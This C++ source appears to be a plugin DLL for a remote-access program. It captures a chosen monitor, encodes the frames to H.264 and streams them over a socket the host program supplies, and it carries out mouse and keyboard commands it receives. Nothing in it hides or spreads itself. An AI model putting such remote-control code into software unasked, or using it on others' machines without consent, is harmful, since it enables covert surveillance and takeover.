#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

// Media Foundation headers
#include <unknwn.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mftransform.h>
#include <mferror.h>
#include <codecapi.h>

#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;
static const uint32_t MONITOR_FRAME_FORMAT_H264 = 2;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// COM GUID definitions for absolute compiler portability
#ifndef CLSID_CMSH264EncoderMFT
static const GUID CLSID_CMSH264EncoderMFT = { 0x6ca50380, 0x1114, 0x4159, { 0x83, 0x93, 0x44, 0x2f, 0xe3, 0xe1, 0xa3, 0xc9 } };
#endif

#ifndef IID_IMFTransform
static const GUID IID_IMFTransform = { 0xbf94c121, 0x5b05, 0x4e6f, { 0x80, 0x00, 0xba, 0x59, 0x89, 0x61, 0x41, 0x4d } };
#endif

#ifndef MFMediaType_Video
static const GUID MFMediaType_Video = { 0x73646976, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
#endif

#ifndef MFVideoFormat_H264
static const GUID MFVideoFormat_H264 = { 0x34363248, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
#endif

#ifndef MFVideoFormat_NV12
static const GUID MFVideoFormat_NV12 = { 0x3231564e, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
#endif

#ifndef MF_MT_MAJOR_TYPE
static const GUID MF_MT_MAJOR_TYPE = { 0x48eba18e, 0xf8c9, 0x4687, { 0xbf, 0x11, 0x0a, 0x74, 0xc9, 0xf9, 0x6a, 0x8f } };
#endif

#ifndef MF_MT_SUBTYPE
static const GUID MF_MT_SUBTYPE = { 0xf7e34c9a, 0x42e8, 0x4714, { 0xb7, 0x4b, 0xcb, 0x29, 0xd7, 0x2c, 0x35, 0xe5 } };
#endif

#ifndef MF_MT_FRAME_SIZE
static const GUID MF_MT_FRAME_SIZE = { 0x1652c33d, 0xd6b2, 0x4012, { 0xb8, 0x34, 0x72, 0x03, 0x08, 0x49, 0xa3, 0x7d } };
#endif

#ifndef MF_MT_FRAME_RATE
static const GUID MF_MT_FRAME_RATE = { 0xc459a2e8, 0x3d2c, 0x4e44, { 0xb1, 0x32, 0xfe, 0xe5, 0x15, 0x6c, 0x7b, 0xb0 } };
#endif

#ifndef MF_MT_AVG_BITRATE
static const GUID MF_MT_AVG_BITRATE = { 0xf3504b43, 0x450a, 0x4224, { 0xaa, 0x11, 0x20, 0xaa, 0x3d, 0x00, 0x66, 0x76 } };
#endif

#ifndef MF_MT_INTERLACE_MODE
static const GUID MF_MT_INTERLACE_MODE = { 0xe2724bb8, 0xe676, 0x4806, { 0xb4, 0xb2, 0xa8, 0xd6, 0xef, 0xb4, 0x4c, 0xcd } };
#endif

#ifndef MF_MT_MPEG2_PROFILE
static const GUID MF_MT_MPEG2_PROFILE = { 0x962221e9, 0x535f, 0x478c, { 0x84, 0x6b, 0xaa, 0x9c, 0x12, 0x98, 0x9a, 0x56 } };
#endif

#ifndef eAVEncH264VProfile_Main
#define eAVEncH264VProfile_Main 77
#endif

#ifndef IID_ICodecAPI
static const GUID IID_ICodecAPI = { 0x9010e743, 0x9477, 0x4497, { 0xa1, 0x78, 0xb7, 0xae, 0x9b, 0xce, 0x22, 0xf1 } };
#endif

#ifndef CODECAPI_AVEncMPVGOPSize
static const GUID CODECAPI_AVEncMPVGOPSize = { 0x951a7a7e, 0xdcee, 0x4630, { 0xb2, 0xc4, 0x98, 0xf1, 0xb1, 0x37, 0x04, 0x16 } };
#endif

// Dynamic MF Function types
typedef HRESULT (WINAPI *MFStartupFn)(ULONG, DWORD);
typedef HRESULT (WINAPI *MFShutdownFn)();
typedef HRESULT (WINAPI *MFCreateSampleFn)(IMFSample**);
typedef HRESULT (WINAPI *MFCreateMemoryBufferFn)(DWORD, IMFMediaBuffer**);
typedef HRESULT (WINAPI *MFCreateMediaTypeFn)(IMFMediaType**);

static HRESULT SetAttributeSize(IMFAttributes* pAttr, REFGUID guid, UINT32 width, UINT32 height) {
    return pAttr->SetUINT64(guid, ((UINT64)width << 32) | height);
}

static HRESULT SetAttributeRatio(IMFAttributes* pAttr, REFGUID guid, UINT32 numerator, UINT32 denominator) {
    return pAttr->SetUINT64(guid, ((UINT64)numerator << 32) | denominator);
}

class CH264Encoder {
private:
    HMODULE m_hMFPlat = NULL;
    HMODULE m_hMFLib = NULL;
    bool m_bMFStarted = false;

    MFStartupFn m_pMFStartup = NULL;
    MFShutdownFn m_pMFShutdown = NULL;
    MFCreateSampleFn m_pMFCreateSample = NULL;
    MFCreateMemoryBufferFn m_pMFCreateMemoryBuffer = NULL;
    MFCreateMediaTypeFn m_pMFCreateMediaType = NULL;

    IMFTransform* m_pTransform = NULL;
    int m_width = 0;
    int m_height = 0;
    UINT64 m_timestamp = 0;

public:
    CH264Encoder() {}

    ~CH264Encoder() {
        Shutdown();
    }

    bool InitializeMF() {
        if (m_bMFStarted) return true;

        m_hMFPlat = LoadLibraryA("mfplat.dll");
        m_hMFLib = LoadLibraryA("mf.dll");
        if (!m_hMFPlat) return false;

        m_pMFStartup = (MFStartupFn)GetProcAddress(m_hMFPlat, "MFStartup");
        m_pMFShutdown = (MFShutdownFn)GetProcAddress(m_hMFPlat, "MFShutdown");
        m_pMFCreateSample = (MFCreateSampleFn)GetProcAddress(m_hMFPlat, "MFCreateSample");
        m_pMFCreateMemoryBuffer = (MFCreateMemoryBufferFn)GetProcAddress(m_hMFPlat, "MFCreateMemoryBuffer");
        m_pMFCreateMediaType = (MFCreateMediaTypeFn)GetProcAddress(m_hMFPlat, "MFCreateMediaType");

        if (!m_pMFStartup || !m_pMFShutdown || !m_pMFCreateSample ||
            !m_pMFCreateMemoryBuffer || !m_pMFCreateMediaType) {
            Shutdown();
            return false;
        }

        HRESULT hr = m_pMFStartup(0x00020070, 0); // MF_VERSION
        if (FAILED(hr)) {
            Shutdown();
            return false;
        }

        m_bMFStarted = true;
        return true;
    }

    void Shutdown() {
        ResetMFT();
        if (m_bMFStarted && m_pMFShutdown) {
            m_pMFShutdown();
            m_bMFStarted = false;
        }
        if (m_hMFLib) {
            FreeLibrary(m_hMFLib);
            m_hMFLib = NULL;
        }
        if (m_hMFPlat) {
            FreeLibrary(m_hMFPlat);
            m_hMFPlat = NULL;
        }
    }

    void ResetMFT() {
        if (m_pTransform) {
            m_pTransform->Release();
            m_pTransform = NULL;
        }
        m_width = 0;
        m_height = 0;
        m_timestamp = 0;
    }

    bool Configure(int width, int height, int fps) {
        if (m_pTransform && m_width == width && m_height == height) {
            return true;
        }

        ResetMFT();

        if (!InitializeMF()) return false;

        HRESULT hr = CoCreateInstance(CLSID_CMSH264EncoderMFT, NULL, CLSCTX_INPROC_SERVER, IID_IMFTransform, (void**)&m_pTransform);
        if (FAILED(hr)) return false;

        // Determine bitrate based on resolution
        UINT32 bitrate = 1000000; // default 1 Mbps
        int pixels = width * height;
        if (pixels >= 1920 * 1080) bitrate = 3000000; // 3 Mbps
        else if (pixels >= 1280 * 720) bitrate = 2000000; // 2 Mbps
        else if (pixels >= 800 * 600) bitrate = 1200000; // 1.2 Mbps

        // Create output media type
        IMFMediaType* pOutputType = NULL;
        hr = m_pMFCreateMediaType(&pOutputType);
        if (FAILED(hr)) return false;

        pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pOutputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_H264);
        pOutputType->SetUINT32(MF_MT_AVG_BITRATE, bitrate);
        SetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, width, height);
        SetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, fps, 1);
        pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, 2); // Progressive
        pOutputType->SetUINT32(MF_MT_MPEG2_PROFILE, eAVEncH264VProfile_Main);

        hr = m_pTransform->SetOutputType(0, pOutputType, 0);
        pOutputType->Release();
        if (FAILED(hr)) return false;

        // Create input media type
        IMFMediaType* pInputType = NULL;
        hr = m_pMFCreateMediaType(&pInputType);
        if (FAILED(hr)) return false;

        pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pInputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
        SetAttributeSize(pInputType, MF_MT_FRAME_SIZE, width, height);
        SetAttributeRatio(pInputType, MF_MT_FRAME_RATE, fps, 1);
        pInputType->SetUINT32(MF_MT_INTERLACE_MODE, 2); // Progressive

        hr = m_pTransform->SetInputType(0, pInputType, 0);
        pInputType->Release();
        if (FAILED(hr)) return false;

        // Configure GOP size for low latency keyframe insertion
        ICodecAPI* pCodecAPI = NULL;
        if (SUCCEEDED(m_pTransform->QueryInterface(IID_ICodecAPI, (void**)&pCodecAPI))) {
            VARIANT varGOP{};
            varGOP.vt = VT_UI4;
            varGOP.ulVal = 30; // GOP size of 30 frames
            pCodecAPI->SetValue(&CODECAPI_AVEncMPVGOPSize, &varGOP);
            pCodecAPI->Release();
        }

        hr = m_pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
        hr = m_pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);

        m_width = width;
        m_height = height;
        m_timestamp = 0;
        return true;
    }

    bool EncodeFrame(const unsigned char* nv12Bytes, int fps, vector<unsigned char>& outBytes) {
        outBytes.clear();
        if (!m_pTransform) return false;

        IMFSample* pSample = NULL;
        HRESULT hr = m_pMFCreateSample(&pSample);
        if (FAILED(hr)) return false;

        IMFMediaBuffer* pBuffer = NULL;
        DWORD bufSize = (m_width * m_height * 3) / 2;
        hr = m_pMFCreateMemoryBuffer(bufSize, &pBuffer);
        if (FAILED(hr)) {
            pSample->Release();
            return false;
        }

        BYTE* pData = NULL;
        pBuffer->Lock(&pData, NULL, NULL);
        memcpy(pData, nv12Bytes, bufSize);
        pBuffer->Unlock();
        pBuffer->SetCurrentLength(bufSize);

        pSample->AddBuffer(pBuffer);
        pBuffer->Release();

        UINT64 duration = 10000000ULL / fps; // 100-ns units
        pSample->SetSampleTime(m_timestamp);
        pSample->SetSampleDuration(duration);
        m_timestamp += duration;

        hr = m_pTransform->ProcessInput(0, pSample, 0);
        pSample->Release();
        if (FAILED(hr)) return false;

        MFT_OUTPUT_STREAM_INFO streamInfo{};
        m_pTransform->GetOutputStreamInfo(0, &streamInfo);

        IMFSample* pOutputSample = NULL;
        IMFMediaBuffer* pOutputBuffer = NULL;
        if (!(streamInfo.dwFlags & MFT_OUTPUT_STREAM_PROVIDES_SAMPLES)) {
            m_pMFCreateSample(&pOutputSample);
            m_pMFCreateMemoryBuffer(streamInfo.cbSize, &pOutputBuffer);
            pOutputSample->AddBuffer(pOutputBuffer);
        }

        MFT_OUTPUT_DATA_BUFFER outputDataBuffer{};
        outputDataBuffer.dwStreamID = 0;
        outputDataBuffer.pSample = pOutputSample;
        outputDataBuffer.dwStatus = 0;
        outputDataBuffer.pEvents = NULL;

        DWORD status = 0;
        HRESULT hrProcess = m_pTransform->ProcessOutput(0, 1, &outputDataBuffer, &status);
        if (SUCCEEDED(hrProcess)) {
            IMFSample* pResSample = outputDataBuffer.pSample ? outputDataBuffer.pSample : pOutputSample;
            if (pResSample) {
                IMFMediaBuffer* pResBuffer = NULL;
                hr = pResSample->GetBufferByIndex(0, &pResBuffer);
                if (SUCCEEDED(hr)) {
                    BYTE* pOutData = NULL;
                    DWORD currentLength = 0;
                    pResBuffer->Lock(&pOutData, NULL, &currentLength);
                    if (currentLength > 0) {
                        outBytes.resize(currentLength);
                        memcpy(outBytes.data(), pOutData, currentLength);
                    }
                    pResBuffer->Unlock();
                    pResBuffer->Release();
                }
            }
        }

        if (outputDataBuffer.pSample && outputDataBuffer.pSample != pOutputSample) {
            outputDataBuffer.pSample->Release();
        }
        if (outputDataBuffer.pEvents) {
            outputDataBuffer.pEvents->Release();
        }
        if (pOutputSample) {
            pOutputSample->Release();
        }
        if (pOutputBuffer) {
            pOutputBuffer->Release();
        }

        return !outBytes.empty();
    }
};

static CH264Encoder g_encoder;

static void ConvertBGRXtoNV12(const unsigned char* bgrx, int width, int height, unsigned char* nv12) {
    int y_plane_size = width * height;
    unsigned char* y_plane = nv12;
    unsigned char* uv_plane = nv12 + y_plane_size;

    // Populate Y plane
    for (int i = 0; i < y_plane_size; ++i) {
        int bgrx_idx = i * 4;
        unsigned char b = bgrx[bgrx_idx];
        unsigned char g = bgrx[bgrx_idx + 1];
        unsigned char r = bgrx[bgrx_idx + 2];

        int y = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
        y_plane[i] = (unsigned char)max(0, min(y, 255));
    }

    // Populate interleaved UV plane with 2x2 downsampling
    int uv_width = width / 2;
    int uv_height = height / 2;
    for (int r = 0; r < uv_height; ++r) {
        for (int c = 0; c < uv_width; ++c) {
            int src_r = r * 2;
            int src_c = c * 2;

            int sum_r = 0, sum_g = 0, sum_b = 0;
            for (int dy = 0; dy < 2; ++dy) {
                for (int dx = 0; dx < 2; ++dx) {
                    int idx = ((src_r + dy) * width + (src_c + dx)) * 4;
                    sum_b += bgrx[idx];
                    sum_g += bgrx[idx + 1];
                    sum_r += bgrx[idx + 2];
                }
            }

            int avg_b = sum_b / 4;
            int avg_g = sum_g / 4;
            int avg_r = sum_r / 4;

            int u = (((-38 * avg_r - 74 * avg_g + 112 * avg_b + 128) >> 8) + 128);
            int v = (((112 * avg_r - 94 * avg_g - 18 * avg_b + 128) >> 8) + 128);

            int uv_idx = (r * uv_width + c) * 2;
            uv_plane[uv_idx] = (unsigned char)max(0, min(u, 255));
            uv_plane[uv_idx + 1] = (unsigned char)max(0, min(v, 255));
        }
    }
}

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    int format,
                                    const vector<unsigned char>& frameBytes) {
    if (frameBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = (uint32_t)format;
    frameHeader.dataSize = (uint32_t)frameBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + frameBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], frameBytes.data(), frameBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static bool capture_monitor_frame_h264(const RECT& rect,
                                       int scalePercent,
                                       int targetFps,
                                       vector<unsigned char>& h264Bytes,
                                       int& outputWidth,
                                       int& outputHeight,
                                       string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    // Align to even dimensions for NV12 conversion and H264 encoding
    int rawW = max(1, (sourceWidth * scalePercent) / 100);
    int rawH = max(1, (sourceHeight * scalePercent) / 100);
    outputWidth = (rawW + 1) & ~1;
    outputHeight = (rawH + 1) & ~1;

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = outputWidth;
    bmi.bmiHeader.biHeight = -outputHeight; // Top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pPixels = NULL;
    HBITMAP bitmap = CreateDIBSection(screenDC, &bmi, DIB_RGB_COLORS, &pPixels, NULL, 0);
    if (!bitmap || !pPixels) {
        if (bitmap) DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture DIB section could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return false;
    }

    // Allocate buffer and convert BGRX to NV12
    int nv12_size = (outputWidth * outputHeight * 3) / 2;
    vector<unsigned char> nv12Bytes(nv12_size);
    ConvertBGRXtoNV12(reinterpret_cast<const unsigned char*>(pPixels), outputWidth, outputHeight, nv12Bytes.data());
    DeleteObject(bitmap);

    // Initialize/configure encoder
    if (!g_encoder.Configure(outputWidth, outputHeight, targetFps)) {
        error = "H.264 Encoder configuration failed";
        return false;
    }

    // Encode frame
    if (!g_encoder.EncodeFrame(nv12Bytes.data(), targetFps, h264Bytes)) {
        if (h264Bytes.empty()) {
            // Need more input frames to produce first output, not a hard error
            error = "";
            return true;
        }
        error = "H.264 encoding failed";
        return false;
    }

    return true;
}

static void capture_loop() {
    CoInitialize(NULL);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        RECT captureRect{};
        bool hasCaptureRect = false;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> h264Bytes;
        int width = 0;
        int height = 0;
        string error;

        if (capture_monitor_frame_h264(captureRect, scale, targetFps, h264Bytes, width, height, error)) {
            if (!h264Bytes.empty()) {
                if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, MONITOR_FRAME_FORMAT_H264, h264Bytes)) {
                    g_captureRunning.store(false);
                    break;
                }
            }
        } else {
            send_monitor_error(sock, error.empty() ? "Capture failed" : error);
            g_captureRunning.store(false);
            break;
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }
    CoUninitialize();
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
    g_encoder.ResetMFT();
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["codec"] = "h264";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            start_capture(sock, monitor, scale, fps);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        g_encoder.Shutdown();
        shutdown_gdiplus();
    }
    return TRUE;
}
